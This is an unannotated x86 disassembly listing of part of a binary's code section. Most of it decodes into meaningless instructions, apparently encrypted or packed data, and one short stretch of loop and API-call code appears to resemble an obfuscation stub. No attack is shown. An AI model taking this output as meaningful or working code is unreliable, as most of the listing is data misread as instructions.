  402019:	stc    
  40201a:	inc    edx
  40201b:	and    al,0xb0
  40201d:	cwde   
  40201e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40201f:	aad    0x62
  402021:	repnz pop edi
  402023:	jbe    0x402041
  402025:	push   esi
  402026:	xchg   ebp,eax
  402027:	xchg   ebx,eax
  402028:	sti    
  402029:	cld    
  40202a:	fbld   TBYTE PTR [ebp-0x19]
  40202d:	jmp    0x402085
  40202f:	inc    ebx
  402030:	pop    esi
  402031:	xor    DWORD PTR [ebx],edx
  402033:	push   es
  402034:	outs   dx,BYTE PTR ds:[esi]
  402035:	mov    ebx,0xa3a87a11
  40203a:	mov    dh,0xd5
  40203c:	adc    ch,BYTE PTR [edx-0x2c]
  40203f:	or     edx,DWORD PTR [ebp-0x7c]
  402042:	test   al,0xfe
  402044:	into   
  402045:	xor    eax,ebp
  402047:	dec    BYTE PTR [eax+ebp*8+0x5c]
  40204b:	or     BYTE PTR [edi+eax*8-0x771a10a8],0x2f
  402053:	pop    ebp
  402054:	test   BYTE PTR [eax-0x13a165ff],bl
  40205a:	mov    WORD PTR [edi-0x4fe118f6],ds
  402060:	lahf   
  402061:	retf   0xe093
  402064:	push   eax
  402065:	lahf   
  402066:	or     dh,BYTE PTR [ecx-0x16a6a791]
  40206c:	(bad)  
  40206d:	gs jb  0x402011
  402070:	mov    gs,ebx
  402072:	lock xor BYTE PTR gs:[ebx-0x72],al
  402077:	xchg   ebx,eax
  402078:	or     esp,DWORD PTR [ecx+0x5b8c294]
  40207e:	or     al,0x0
  402080:	add    BYTE PTR [eax-0xa],dh
  402083:	clc    
  402084:	sbb    DWORD PTR [ebx],ebx
  402086:	inc    eax
  402087:	fdivrp st(3),st
  402089:	imul   eax,DWORD PTR [ebx+eiz*4-0x4e219185],0xa8027e5e
  402094:	in     al,0x0
  402096:	test   eax,0x6d84350e
  40209b:	and    eax,0xe18963ec
  4020a0:	jle    0x40207f
  4020a2:	stc    
  4020a3:	mov    ch,BYTE PTR [edi]
  4020a5:	leave  
  4020a6:	sbb    eax,0xe10ec7bf
  4020ab:	fs fcmovnb st,st(0)
  4020ae:	popa   
  4020af:	sbb    BYTE PTR [ebx+0x6f4de873],0x97
  4020b6:	or     BYTE PTR [ecx-0xfe1697d],ch
  4020bc:	ds int 0x39
  4020bf:	mul    edi
  4020c1:	or     cl,BYTE PTR [esp+eax*2-0x4ce7f44d]
  4020c8:	imul   ecx,DWORD PTR [esi+0x22499227],0x1f
  4020cf:	js     0x402148
  4020d1:	mov    edx,0x1ee3a7cc
  4020d6:	push   DWORD PTR [ecx-0x3b]
  4020d9:	lds    esi,FWORD PTR [edi]
  4020db:	jnp    0xcd16f26d
  4020e1:	ss pop esp
  4020e3:	push   edi
  4020e4:	or     ebx,DWORD PTR [edi]
  4020e6:	xor    edx,0x49251d71
  4020ec:	or     eax,0xb03b31e8
  4020f1:	adc    al,0x6a
  4020f3:	popf   
  4020f4:	mov    esi,0xa7094d87
  4020f9:	pop    edx
  4020fa:	jne    0x4020f1
  4020fc:	xchg   ecx,eax
  4020fd:	pop    edi
  4020fe:	or     edi,eax
  402100:	and    DWORD PTR [esi],edx
  402102:	xchg   ebx,eax
  402103:	jg     0x40209a
  402105:	dec    ecx
  402106:	bound  ebp,QWORD PTR [ecx-0x31]
  402109:	dec    edi
  40210a:	mov    ebp,0x7a39687a
  402110:	loop   0x4020ea
  402112:	dec    ebp
  402113:	(bad)  
  402114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402115:	push   esi
  402116:	cmp    al,BYTE PTR [ecx-0x4f9abe0d]
  40211c:	add    eax,0x689c382d
  402121:	mov    dh,0x3d
  402123:	inc    edi
  402124:	mov    eax,ds:0x2789945
  402129:	jmp    0x402163
  40212b:	adc    eax,DWORD PTR ds:0x842c2948
  402131:	fisub  WORD PTR [edx]
  402133:	fcomi  st,st(1)
  402135:	mov    bh,dl
  402137:	das    
  402138:	pop    esi
  402139:	loop   0x4021a3
  40213b:	push   edx
  40213c:	add    DWORD PTR [edx+edi*1],esp
  40213f:	or     bl,dh
  402141:	xor    al,bl
  402143:	pop    es
  402144:	pop    edx
  402145:	mov    esi,0xf1171506
  40214a:	adc    ah,BYTE PTR [esi+esi*4+0x73602a22]
  402151:	or     al,0xb1
  402153:	adc    DWORD PTR [eax-0x7d],ebp
  402156:	inc    eax
  402157:	fmul   QWORD PTR [esi]
  402159:	adc    dl,BYTE PTR [ebp-0x7c3ba041]
  40215f:	adc    eax,0xe098fe9a
  402164:	or     al,cl
  402166:	mov    WORD PTR [ebx+0x8c32a3a],?
  40216c:	push   es
  40216d:	int    0x20
  40216f:	fnstcw WORD PTR [edi+0x3b]
  402172:	pop    eax
  402173:	jge    0x402113
  402175:	inc    ebx
  402176:	mov    dl,dh
  402178:	jmp    0xc57f:0x48cae0f3
  40217f:	adc    BYTE PTR [eax+0x1760cac9],dl
  402185:	sub    ecx,DWORD PTR [ecx+ecx*1+0x46]
  402189:	es sti 
  40218b:	ror    cl,1
  40218d:	ins    DWORD PTR es:[edi],dx
  40218e:	mov    bh,0x10
  402190:	fwait
  402191:	mov    DWORD PTR [edi+0x6b],eax
  402194:	cwde   
  402195:	pop    edx
  402196:	add    BYTE PTR [esp+ebx*4+0x1755f203],ah
  40219d:	adc    BYTE PTR [esi+0x11],cl
  4021a0:	mov    eax,0x6c65836d
  4021a5:	push   es
  4021a6:	jno    0x40217a
  4021a8:	test   eax,ebx
  4021aa:	jmp    0xd1dbe870
  4021af:	jmp    0xa6198bdf
  4021b4:	xchg   esp,eax
  4021b5:	lock cmps DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4021b8:	(bad)  [ebp+0x612918d6]
  4021be:	mov    esp,0x1720e2b0
  4021c3:	pand   mm3,QWORD PTR [esi-0x10]
  4021c7:	and    eax,0x6e4d2c48
  4021cc:	mov    esi,0xcbfd0415
  4021d1:	jecxz  0x40222f
  4021d3:	push   ecx
  4021d4:	xor    eax,0x9f3fe0f3
  4021d9:	dec    ebp
  4021da:	imul   DWORD PTR [eax+0x3]
  4021dd:	ins    DWORD PTR es:[edi],dx
  4021de:	push   eax
  4021df:	ret    
  4021e0:	iret   
  4021e1:	ret    0x8630
  4021e4:	add    BYTE PTR [edi+0x2e6a81ea],0xb0
  4021eb:	push   cs
  4021ec:	sbb    ch,BYTE PTR [edx]
  4021ee:	ds add al,0x7f
  4021f1:	pop    ss
  4021f2:	data16 fdivr DWORD PTR [eax+eiz*8-0x84e7e21]
  4021fa:	jmp    0x40225b
  4021fc:	stos   DWORD PTR es:[edi],eax
  4021fd:	fs or  eax,0x88786af7
  402203:	dec    ebp
  402204:	and    eax,eax
  402206:	popa   
  402207:	sbb    BYTE PTR [edx+0x161f6a23],ah
  40220d:	and    esp,DWORD PTR [edi+0x56]
  402210:	cmp    BYTE PTR [eax+0x6a],ah
  402213:	dec    edi
  402214:	fcomi  st,st(1)
  402216:	daa    
  402217:	pop    edx
  402218:	pop    esi
  402219:	ss pop ss
  40221b:	mov    cs,WORD PTR [eax-0x3f]
  40221e:	and    al,0xb
  402220:	cmp    edx,ecx
  402222:	gs xchg ebx,eax
  402224:	retf   0xa41d
  402227:	int3   
  402228:	stos   DWORD PTR es:[edi],eax
  402229:	mov    eax,ds:0x1d4d7928
  40222e:	lds    ebx,FWORD PTR [edx+0x19]
  402231:	push   ebx
  402232:	sub    BYTE PTR [ebp-0x75],dl
  402235:	mov    ds:0xbe967125,eax
  40223a:	(bad)
  40223d:	xor    eax,0x54c2e55e
  402242:	or     edi,DWORD PTR [esi-0x565b6643]
  402248:	jbe    0x40222c
  40224a:	inc    edi
  40224b:	add    eax,0x5dffc9e7
  402250:	mov    eax,ds:0x59b58b07
  402255:	(bad)  
  402256:	jno    0x402298
  402258:	icebp  
  402259:	xchg   ecx,eax
  40225a:	mov    ecx,0x8ff4c60c
  40225f:	stos   BYTE PTR es:[edi],al
  402260:	adc    eax,ebx
  402262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402263:	jo     0x4022dd
  402265:	mov    BYTE PTR [ecx],cl
  402267:	cmc    
  402268:	sub    ch,BYTE PTR [ecx+0x68]
  40226b:	aad    0xef
  40226d:	inc    esp
  40226e:	and    eax,0x1ce5280f
  402273:	daa    
  402274:	mov    edx,edx
  402276:	not    DWORD PTR [ebx-0x26]
  402279:	jbe    0x402205
  40227b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40227c:	leave  
  40227d:	push   0xffffffea
  40227f:	out    0x4a,al
  402281:	int    0xdc
  402283:	(bad)  
  402284:	shl    BYTE PTR [esi+0x39],cl
  402287:	(bad)  
  40228a:	pop    esi
  40228b:	and    al,0x48
  40228d:	mov    BYTE PTR ds:0xc6d87c52,cl
  402293:	adc    bh,BYTE PTR ds:0xfae90f57
  402299:	mov    edi,0x1b15b2c8
  40229e:	pop    es
  40229f:	xchg   ebx,eax
  4022a0:	push   ecx
  4022a1:	ins    DWORD PTR es:[edi],dx
  4022a2:	and    cl,0xc8
  4022a5:	ret    0xecda
  4022a8:	daa    
  4022a9:	(bad)  
  4022ab:	dec    eax
  4022ac:	in     al,dx
  4022ad:	adc    eax,0x33fd3568
  4022b2:	push   0xffffff84
  4022b4:	retf   
  4022b5:	(bad)  
  4022b6:	jp     0x4022f5
  4022b8:	cmp    eax,0x2709ee73
  4022bd:	lahf   
  4022be:	(bad)  
  4022bf:	out    dx,al
  4022c0:	and    al,0x65
  4022c2:	imul   ebp,DWORD PTR [eax],0xc
  4022c5:	adc    BYTE PTR [edx+0x255cdccb],dh
  4022cb:	mov    eax,0xf7e70383
  4022d0:	mov    ah,0x33
  4022d2:	inc    edx
  4022d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022d4:	inc    esi
  4022d5:	mul    BYTE PTR [eax-0x33]
  4022d8:	sub    BYTE PTR [esi+0x69],dl
  4022db:	aad    0x70
  4022dd:	sahf   
  4022de:	jmp    0x40229a
  4022e0:	aam    0x81
  4022e2:	sbb    DWORD PTR [eax+edx*4-0x9],edx
  4022e6:	mov    dh,0x72
  4022e8:	fisub  DWORD PTR [ebx+ecx*4]
  4022eb:	mov    ch,0xf6
  4022ed:	mov    ebx,0x9ad00f28
  4022f2:	and    al,BYTE PTR [edx-0x70644082]
  4022f8:	call   0x6d1a7d87
  4022fd:	xchg   esp,eax
  4022fe:	lea    ebx,[esi+0x4a8c4a4]
  402304:	das    
  402305:	mov    BYTE PTR [esi],dh
  402307:	sub    ebx,DWORD PTR [eax]
  402309:	out    dx,al
  40230a:	addr16 test ax,0x583f
  40230f:	nop
  402310:	and    al,0xad
  402312:	lods   al,BYTE PTR ds:[esi]
  402313:	int3   
  402314:	xlat   BYTE PTR ds:[ebx]
  402315:	je     0x40236b
  402317:	xchg   ebx,eax
  402318:	xlat   BYTE PTR ds:[ebx]
  402319:	jns    0x4022c5
  40231b:	icebp  
  40231c:	jmp    0x4022f6
  40231e:	test   BYTE PTR [ebp+0x5d],0x6b
  402322:	adc    BYTE PTR [eax+eiz*4+0x390384e2],dh
  402329:	dec    ebp
  40232a:	and    al,0x7c
  40232c:	add    bh,BYTE PTR [eax+0x28016518]
  402332:	repz inc eax
  402334:	push   ecx
  402335:	mov    WORD PTR [ebp*8+0x3c72191e],?
  40233c:	mov    DWORD PTR [ebx],edx
  40233e:	or     al,0x60
  402340:	in     eax,dx
  402341:	rol    BYTE PTR [ebx-0x17],0x95
  402345:	and    eax,0x5d88861a
  40234a:	hlt    
  40234b:	cs fwait
  40234d:	(bad)  
  40234e:	cmp    bl,dh
  402350:	mov    bh,0xb9
  402352:	pusha  
  402353:	jge    0x402386
  402355:	fistp  DWORD PTR [edi-0x7a72ffad]
  40235b:	push   0x43ffffff
  402360:	mov    DWORD PTR [ebp-0x8],eax
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433717,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4337fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43377b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43377b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43377b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43377b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43377b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4337bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4337f7
  4023d7:	or     DWORD PTR ds:0x433767,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433777,0x43383f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43376f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43376f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43376f,ecx
  40240a:	cmp    DWORD PTR ds:0x43376f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433910
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43376f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43376f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43376f,ecx
  402450:	cmp    DWORD PTR ds:0x43376f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx-0x7e6e5390]
  402480:	pop    ecx
  402481:	jmp    0x7d6f:0x7e7e01ba
  402488:	jle    0x402508
  40248a:	add    al,0xf3
  40248c:	je     0x402423
  40248e:	iret   
  40248f:	push   0x900c7859
  402494:	xchg   DWORD PTR [esi],esi
  402496:	lahf   
  402497:	pop    eax
  402498:	(bad)  
  402499:	pop    edi
  40249a:	xchg   esi,eax
  40249b:	aad    0x37
  40249d:	jge    0x402498
  40249f:	jmp    0x402441
  4024a1:	retf   0xae0b
  4024a4:	popa   
  4024a5:	fyl2x  
  4024a7:	jecxz  0x4024d0
  4024a9:	xchg   ebx,eax
  4024aa:	pop    esp
  4024ab:	sbb    cl,BYTE PTR [ebx+0x768e9f8d]
  4024b1:	add    edx,eax
  4024b3:	add    BYTE PTR fs:[esi],bh
  4024b6:	cmp    dl,BYTE PTR [eax-0x74]
  4024b9:	sbb    ecx,DWORD PTR [ebx]
  4024bb:	cmp    BYTE PTR [edi+0x6d],dl
  4024be:	mov    BYTE PTR [edx+0x71],bl
  4024c1:	or     DWORD PTR [edi],eax
  4024c3:	cs pop ss
  4024c5:	sub    eax,edx
  4024c7:	inc    esp
  4024c8:	or     eax,0x72871baf
  4024cd:	jg     0x4024ea
  4024cf:	cmp    bl,BYTE PTR [edx-0x19]
  4024d2:	xchg   ch,bl
  4024d4:	mov    ds:0x6427518b,eax
  4024d9:	jo     0x40252a
  4024db:	ret    0x386e
  4024de:	fidiv  DWORD PTR [ecx+ecx*4-0x11]
  4024e2:	pop    edi
  4024e3:	in     al,dx
  4024e4:	(bad)  
  4024e5:	mov    ch,0x41
  4024e7:	sar    BYTE PTR [eax*1+0x645b21ea],1
  4024ee:	fstp   DWORD PTR [esi+edx*2]
  4024f1:	jmp    0x8eaf0b6a
  4024f6:	push   ss
  4024f7:	sbb    DWORD PTR [edx+esi*8-0x4787d8f1],edi
  4024fe:	mov    eax,ds:0xba581615
  402503:	inc    edi
  402504:	int3   
  402505:	ins    BYTE PTR es:[edi],dx
  402506:	push   edi
  402507:	dec    ecx
  402508:	xor    edx,DWORD PTR [ecx]
  40250a:	mov    al,0x7f
  40250c:	jb     0x4024ce
  40250e:	jl     0x402580
  402510:	sti    
  402511:	addr16 add al,0x2a
  402514:	push   ds
  402515:	stc    
  402516:	test   DWORD PTR [edx-0xf],edi
  402519:	cmp    al,0xe8
  40251b:	fs loope 0x402557
  40251e:	fisttp QWORD PTR [ebp-0x37]
  402521:	inc    ecx
  402522:	gs pop ebp
  402524:	ficom  WORD PTR [edi]
  402526:	rcl    BYTE PTR [eax+ecx*8-0x3d],0x25
  40252b:	fpatan 
  40252d:	push   0x9
  40252f:	not    DWORD PTR ds:0x581e40dd
  402535:	cmp    ebx,DWORD PTR [ecx-0x2e]
  402538:	add    DWORD PTR [eax],edx
  40253a:	sti    
  40253b:	retf   0xba42
  40253e:	addr16 aad 0x76
  402541:	inc    BYTE PTR [eax+0x59ce6cf1]
  402547:	ss adc al,0xb5
  40254a:	inc    ebx
  40254b:	dec    esi
  40254c:	fldcw  WORD PTR [ecx]
  40254e:	add    esp,edx
  402550:	je     0x40251c
  402552:	mov    ds:0x781f07c1,al
  402557:	dec    eax
  402558:	bound  edx,QWORD PTR [edx-0x3302e5ba]
  40255e:	aad    0x88
  402560:	out    0x26,al
  402562:	adc    eax,0x39f71c42
  402567:	rcr    BYTE PTR [esi],cl
  402569:	aaa    
  40256a:	cmp    BYTE PTR [esi],bl
  40256c:	aas    
  40256d:	cdq    
  40256e:	mov    edi,0xf52cd8f
  402573:	push   ss
  402574:	and    bl,BYTE PTR [ebp-0x67]
  402577:	jg     0x402598
  402579:	or     DWORD PTR [ebx+0x385c242],esp
  40257f:	inc    ebx
  402580:	leave  
  402581:	ds ja  0x4025fb
  402584:	(bad)  
  402586:	in     eax,dx
  402587:	daa    
  402588:	xchg   edi,eax
  402589:	out    0xc9,eax
  40258b:	lds    edx,FWORD PTR [edx-0x12cfde61]
  402591:	rcr    DWORD PTR [ecx+0x1a63bfd5],1
  402597:	cld    
  402598:	aas    
  402599:	fs mov ebx,0x15d9c9df
  40259f:	pusha  
  4025a0:	pop    edx
  4025a1:	lods   eax,DWORD PTR ds:[esi]
  4025a2:	fmul   st,st(3)
  4025a4:	frstpm(287 only) 
  4025a6:	mov    edx,0x33f75a47
  4025ab:	outs   dx,BYTE PTR ds:[esi]
  4025ac:	iret   
  4025ad:	jmp    ebp
  4025af:	stc    
  4025b0:	push   ebx
  4025b1:	inc    ebp
  4025b2:	lahf   
  4025b3:	aam    0xad
  4025b5:	pop    ebp
  4025b6:	(bad)  
  4025b7:	lock fdiv QWORD PTR [esi+0x19c4041c]
  4025be:	out    dx,al
  4025bf:	test   DWORD PTR [edi],eax
  4025c1:	jge    0x402612
  4025c3:	jbe    0x40258a
  4025c5:	shl    edx,1
  4025c7:	shl    BYTE PTR [edi+0x31],1
  4025ca:	je     0x402613
  4025cc:	xabort 0x6e
  4025cf:	push   edi
  4025d0:	outs   dx,DWORD PTR ds:[esi]
  4025d1:	mov    eax,0xff055db9
  4025d6:	repz retf 
  4025d8:	add    bh,BYTE PTR [ecx+0x60]
  4025db:	popf   
  4025dc:	pop    eax
  4025dd:	mov    dh,0xbf
  4025df:	push   ecx
  4025e0:	push   edx
  4025e1:	ret    0x601d
  4025e4:	or     BYTE PTR [edx+edx*4],0xc5
  4025e8:	(bad)  
  4025e9:	fs ss stos BYTE PTR es:[edi],al
  4025ec:	inc    ebx
  4025ed:	test   DWORD PTR [edx],edi
  4025ef:	fs xchg ebp,eax
  4025f1:	cdq    
  4025f2:	call   0x180f:0x1c20
  4025f8:	test   DWORD PTR [ecx],ebx
  4025fa:	mov    ebp,0x50313322
  4025ff:	pop    eax
  402600:	dec    eax
  402601:	mov    edi,0xca38b14e
  402606:	dec    ecx
  402607:	aad    0xf
  402609:	in     eax,dx
  40260a:	and    BYTE PTR [eax+eax*4-0x1d84412e],cl
  402611:	out    0x6c,eax
  402613:	mov    ah,0xb7
  402615:	push   0xffffffb0
  402617:	(bad)  
  402618:	xor    al,0xc3
  40261a:	pop    ds
  40261b:	mov    esp,DWORD PTR [eax]
  40261d:	xor    edi,esp
  40261f:	push   ss
  402620:	cmp    DWORD PTR [edx+0x1f],esp
  402623:	aad    0xab
  402625:	jp     0x402670
  402627:	enter  0x4d85,0x7e
  40262b:	xor    al,0x94
  40262d:	into   
  40262e:	leave  
  40262f:	push   esp
  402630:	je     0x4025b2
  402632:	xchg   edi,eax
  402633:	mov    ecx,0xb93829af
  402638:	xor    DWORD PTR [edx-0x673b70ff],esp
  40263e:	add    eax,DWORD PTR [esi+0x8]
  402641:	or     DWORD PTR [eax-0x2e],ebp
  402644:	ins    BYTE PTR es:[edi],dx
  402645:	cli    
  402646:	and    BYTE PTR [eax*4-0x2f9a1b04],ch
  40264d:	ja     0x402637
  40264f:	xchg   ebp,ebp
  402651:	dec    esi
  402652:	fisttp DWORD PTR [esi-0xb]
  402655:	scas   al,BYTE PTR es:[edi]
  402656:	mov    al,ds:0xdd9abc9b
  40265b:	pop    ss
  40265c:	arpl   WORD PTR [ebx-0x25],di
  40265f:	or     eax,0x8f6dcc96
  402664:	(bad)  
  402665:	sub    ah,BYTE PTR [edx+ecx*8]
  402668:	out    0x5d,al
  40266a:	xor    DWORD PTR [edx+0x53],ecx
  40266d:	push   es
  40266e:	jae    0x402604
  402670:	lea    edx,[ebp-0x1f7507cc]
  402676:	and    BYTE PTR [eax+0x2d],bh
  402679:	mov    dh,0x29
  40267b:	xor    BYTE PTR [edx],bl
  40267d:	in     eax,0x60
  40267f:	in     eax,dx
  402680:	push   ebp
  402681:	je     0x4026a0
  402683:	jnp    0x402633
  402685:	sbb    BYTE PTR [ebp-0x1c],dh
  402688:	data16 mov ah,dh
  40268b:	push   ds
  40268c:	push   edi
  40268d:	(bad)
  402690:	xor    BYTE PTR [eax+0x74],bl
  402693:	xor    edx,DWORD PTR [ecx]
  402695:	pop    esi
  402696:	mov    dh,0x7f
  402698:	mov    esp,ebp
  40269a:	xor    al,0xbf
  40269c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40269d:	sbb    eax,0x760af2c2
  4026a2:	(bad)  
  4026a3:	jecxz  0x40263c
  4026a5:	sub    edi,DWORD PTR [eax]
  4026a7:	shl    DWORD PTR [eax],0x86
  4026aa:	sub    DWORD PTR [edx-0x3],esi
  4026ad:	adc    bh,BYTE PTR [esi+0x2618d54d]
  4026b3:	mov    ebp,0x5080ebd2
  4026b8:	inc    ecx
  4026b9:	jmp    0x402736
  4026bb:	jne    0x402696
  4026bd:	pop    ds
  4026be:	sti    
  4026bf:	push   es
  4026c0:	aam    0x1d
  4026c2:	div    DWORD PTR [ecx]
  4026c4:	cmp    bl,BYTE PTR [ebp+0x62]
  4026c7:	cdq    
  4026c8:	jns    0x402741
  4026ca:	ss mov bl,0xe3
  4026cd:	sbb    ebp,DWORD PTR [eax+0x27]
  4026d0:	neg    edx
  4026d2:	lods   al,BYTE PTR ds:[esi]
  4026d3:	cmp    al,0xae
  4026d5:	and    ecx,DWORD PTR [edi+ebx*1]
  4026d8:	in     eax,0xbe
  4026da:	lods   eax,DWORD PTR ds:[esi]
  4026db:	aam    0xc5
  4026dd:	xor    ebp,DWORD PTR ds:0xc5d58bc4
  4026e3:	lahf   
  4026e4:	pop    edx
  4026e5:	jnp    0x40274b
  4026e7:	rol    DWORD PTR [eax],0x47
  4026ea:	add    al,0x88
  4026ec:	dec    ecx
  4026ed:	dec    esi
  4026ee:	push   0x923f0365
  4026f3:	sub    eax,DWORD PTR [ebp-0x2fe3c2ad]
  4026f9:	scas   eax,DWORD PTR es:[edi]
  4026fa:	xor    esp,DWORD PTR [ebp-0x6f]
  4026fd:	mov    ds:0x621c4385,al
  402702:	and    eax,0xad5d37a3
  402707:	xlat   BYTE PTR ds:[ebx]
  402708:	int    0xd8
  40270a:	ss xchg edx,eax
  40270c:	aaa    
  40270d:	clc    
  40270e:	add    eax,0x9dc16d7f
  402713:	sbb    eax,0x3996c3d3
  402718:	sbb    al,0xb3
  40271a:	popf   
  40271b:	cwde   
  40271c:	es dec eax
  40271e:	fadd   DWORD PTR [eax+0x7a4e1f53]
  402724:	ret    0xbb30
  402727:	ficomp WORD PTR [esi-0x69]
  40272a:	inc    esi
  40272b:	repnz in al,dx
  40272d:	adc    al,0xdb
  40272f:	into   
  402730:	add    ebp,DWORD PTR [ebx-0x915eeed]
  402736:	pop    eax
  402737:	xor    DWORD PTR [ebp-0x16],ebp
  40273a:	imul   edi,DWORD PTR [esi+0x3d],0xd83cb5ee
  402741:	ja     0x4026c6
  402743:	xor    al,0x64
  402746:	jno    0x402700
  402748:	jnp    0x4027bc
  40274a:	xchg   edx,eax
  40274b:	cmpps  xmm5,xmm2,0xe0
  40274f:	pop    ebp
  402750:	xlat   BYTE PTR ds:[ebx]
  402751:	inc    esp
  402752:	loopne 0x402771
  402754:	rcr    DWORD PTR [eax],cl
  402756:	sar    ebx,1
  402758:	icebp  
  402759:	push   0xffffffbf
  40275b:	outs   dx,DWORD PTR ds:[esi]
  40275c:	jae    0x402786
  40275e:	mov    ah,BYTE PTR [edx+0x65807fc3]
  402764:	xchg   edi,edx
  402766:	rcl    BYTE PTR [edx+ebp*1-0x3038d769],cl
  40276d:	adc    eax,0x447d46ab
  402772:	mov    edi,0x2167eaa0
  402777:	aad    0xfc
  402779:	or     DWORD PTR [edi+eax*2],ebx
  40277c:	xchg   esi,eax
  40277d:	dec    esi
  40277e:	and    eax,0x1a033b6d
  402783:	cli    
  402784:	add    dl,ah
  402786:	test   al,0xcb
  402788:	inc    esi
  402789:	mov    al,0x6f
  40278b:	enter  0x5fe1,0xac
  40278f:	test   BYTE PTR [ebp+0x48],ch
  402792:	out    dx,al
  402793:	dec    ecx
  402794:	loop   0x4027ed
  402796:	jo     0x40277c
  402798:	frstor [ebp+0x1c57fa2e]
  40279e:	mov    ah,0xc6
  4027a0:	sub    edx,DWORD PTR [edx]
  4027a2:	ret    
  4027a3:	and    al,0x5f
  4027a5:	jge    0x402811
  4027a7:	mov    ebp,0x1de89c74
  4027ac:	push   ecx
  4027ad:	xor    bl,BYTE PTR [ecx]
  4027af:	nop
  4027b0:	cmp    edx,DWORD PTR [edi+0x42]
  4027b3:	mov    ebp,0x7de75e63
  4027b8:	in     eax,0x8f
  4027ba:	data16 das 
  4027bc:	out    dx,al
  4027bd:	fwait
  4027be:	and    al,0x63
  4027c0:	lods   eax,DWORD PTR ds:[esi]
  4027c1:	jl     0x4027b8
  4027c3:	sub    ebx,eax
  4027c5:	int3   
  4027c6:	lock or esi,DWORD PTR es:[esi]
  4027ca:	lods   al,BYTE PTR ds:[esi]
  4027cb:	rcl    BYTE PTR [ecx-0x52],1
  4027ce:	xchg   edx,eax
  4027cf:	pop    ecx
  4027d0:	addr16 dec ebx
  4027d2:	dec    eax
  4027d3:	lods   al,BYTE PTR ds:[esi]
  4027d4:	cmp    al,0x4a
  4027d6:	lods   al,BYTE PTR ds:[esi]
  4027d7:	xchg   bl,ch
  4027d9:	mov    dl,0xb7
  4027db:	xchg   cl,cl
  4027dd:	jns    0x40279f
  4027df:	loopne 0x4027b4
  4027e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027e2:	dec    ebp
  4027e3:	mov    bh,0x73
  4027e5:	and    dh,ah
  4027e7:	jne    0x40276e
  4027e9:	mov    WORD PTR [ecx+ebp*2+0x33],?
  4027ed:	pop    ss
  4027ee:	ins    BYTE PTR es:[edi],dx
  4027ef:	adc    al,0x7b
  4027f1:	fadd   DWORD PTR [esi-0x4f]
  4027f4:	inc    edx
  4027f5:	mov    eax,ds:0x31347e14
  4027fa:	add    ah,ch
  4027fc:	fs push edx
  4027fe:	stos   BYTE PTR es:[edi],al
  4027ff:	adc    al,0x6d
  402801:	inc    ebx
  402802:	cmp    DWORD PTR [edx+0x2c51fb05],0xfe75e9e1
  40280c:	enter  0xb0f4,0x64
  402810:	test   al,0x37
  402812:	imul   ebp,DWORD PTR [ebp+0x33],0xeb278475
  402819:	fcmovb st,st(6)
  40281b:	pushf  
  40281c:	pop    edi
  40281d:	ror    BYTE PTR ds:0xa15bb30a,1
  402823:	rol    BYTE PTR [esi+0x4b5d27ca],cl
  402829:	rol    cl,1
  40282b:	inc    ecx
  40282c:	fdivr  st(5),st
  40282e:	out    0x77,eax
  402830:	dec    eax
  402831:	inc    esi
  402832:	fadd   st,st(0)
  402834:	jo     0x4027d2
  402836:	cdq    
  402837:	xchg   ebp,eax
  402838:	jb     0x402813
  40283a:	sbb    esi,DWORD PTR [ebx+0x52b35cbb]
  402840:	fwait
  402841:	push   ebp
  402842:	or     bl,BYTE PTR [ebx+ebp*4]
  402845:	push   0x1649ab9a
  40284a:	out    0xbc,al
  40284c:	shl    DWORD PTR [ecx+0x32c02f3f],cl
  402852:	mov    ds:0x51033861,eax
